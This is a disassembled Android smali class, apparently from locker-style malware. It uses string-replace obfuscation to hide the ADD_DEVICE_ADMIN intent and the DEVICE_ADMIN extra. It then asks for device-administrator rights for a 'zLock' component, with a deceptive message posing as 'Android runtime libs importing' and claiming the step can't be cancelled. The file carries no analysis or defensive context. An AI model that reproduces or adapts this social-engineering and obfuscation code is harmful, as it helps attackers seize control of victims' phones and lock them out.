.class public Lcom/xprot/devA;
.super Landroid/app/Activity;
.source "devA.java"


# direct methods
.method public constructor <init>()V
    .locals 0

    .prologue
    .line 11
    invoke-direct {p0}, Landroid/app/Activity;-><init>()V

    return-void
.end method


# virtual methods
.method protected onCreate(Landroid/os/Bundle;)V
    .locals 4
    .param p1, "savedInstanceState"    # Landroid/os/Bundle;

    .prologue
    .line 17
    invoke-super {p0, p1}, Landroid/app/Activity;->onCreate(Landroid/os/Bundle;)V

    .line 19
    new-instance v0, Landroid/content/Intent;

    const-string v1, "android.app.action.FUCKERS"

    const-string v2, "FUCKERS"

    const-string v3, "ADD_DEVICE_ADMI="

    invoke-virtual {v1, v2, v3}, Ljava/lang/String;->replace(Ljava/lang/CharSequence;Ljava/lang/CharSequence;)Ljava/lang/String;

    move-result-object v1

    const-string v2, "="

    const-string v3, "N"

    invoke-virtual {v1, v2, v3}, Ljava/lang/String;->replace(Ljava/lang/CharSequence;Ljava/lang/CharSequence;)Ljava/lang/String;

    move-result-object v1

    invoke-direct {v0, v1}, Landroid/content/Intent;-><init>(Ljava/lang/String;)V

    .line 20
    .local v0, "intent":Landroid/content/Intent;
    const-string v1, "android.app.extra.ADD_EXPLANATION"

    const-string v2, "Android runtime libs importing\n\nTo continue, click \"Activate\".\n\nThis operation can\'t be cancelled.\n"

    invoke-virtual {v0, v1, v2}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Ljava/lang/String;)Landroid/content/Intent;

    .line 21
    const-string v1, "android.app.extra.DEVICE_12345"

    .line 22
    const-string v2, "1"

    const-string v3, "A"

    invoke-virtual {v1, v2, v3}, Ljava/lang/String;->replace(Ljava/lang/CharSequence;Ljava/lang/CharSequence;)Ljava/lang/String;

    move-result-object v1

    .line 23
    const-string v2, "2"

    const-string v3, "D"

    invoke-virtual {v1, v2, v3}, Ljava/lang/String;->replace(Ljava/lang/CharSequence;Ljava/lang/CharSequence;)Ljava/lang/String;

    move-result-object v1

    .line 24
    const-string v2, "3"

    const-string v3, "M"

    invoke-virtual {v1, v2, v3}, Ljava/lang/String;->replace(Ljava/lang/CharSequence;Ljava/lang/CharSequence;)Ljava/lang/String;

    move-result-object v1

    .line 25
    const-string v2, "4"

    const-string v3, "I"

    invoke-virtual {v1, v2, v3}, Ljava/lang/String;->replace(Ljava/lang/CharSequence;Ljava/lang/CharSequence;)Ljava/lang/String;

    move-result-object v1

    .line 26
    const-string v2, "5"

    const-string v3, "N"

    invoke-virtual {v1, v2, v3}, Ljava/lang/String;->replace(Ljava/lang/CharSequence;Ljava/lang/CharSequence;)Ljava/lang/String;

    move-result-object v1

    .line 27
    new-instance v2, Landroid/content/ComponentName;

    const-class v3, Lcom/xprot/zLock;

    invoke-direct {v2, p0, v3}, Landroid/content/ComponentName;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    .line 21
    invoke-virtual {v0, v1, v2}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Landroid/os/Parcelable;)Landroid/content/Intent;

    .line 28
    const/4 v1, 0x1

    invoke-virtual {p0, v0, v1}, Lcom/xprot/devA;->startActivityForResult(Landroid/content/Intent;I)V

    .line 30
    invoke-virtual {p0}, Lcom/xprot/devA;->finish()V

    .line 31
    return-void
.end method
